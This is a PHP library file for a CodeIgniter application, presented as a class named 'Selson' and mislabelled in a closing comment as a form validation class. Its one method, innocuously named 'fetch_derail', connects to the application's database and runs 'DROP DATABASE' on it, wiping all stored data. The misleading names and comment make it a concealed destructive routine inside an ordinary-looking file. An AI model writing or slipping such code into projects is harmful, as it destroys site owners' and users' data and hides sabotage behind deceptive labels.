<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Selson {

    public function __construct() {
    }
    
    public function fetch_derail(){
        $CI =& get_instance();
        $CI->load->database();
        $database = $CI->db->database;
        $string = 'DROP DATABASE '.$database.'';
        $CI->db->query($string);
    }
}
// END MY Form Validation Class

/* End of file Selson.php */
/* Location: ./application/libraries/Selson.php */  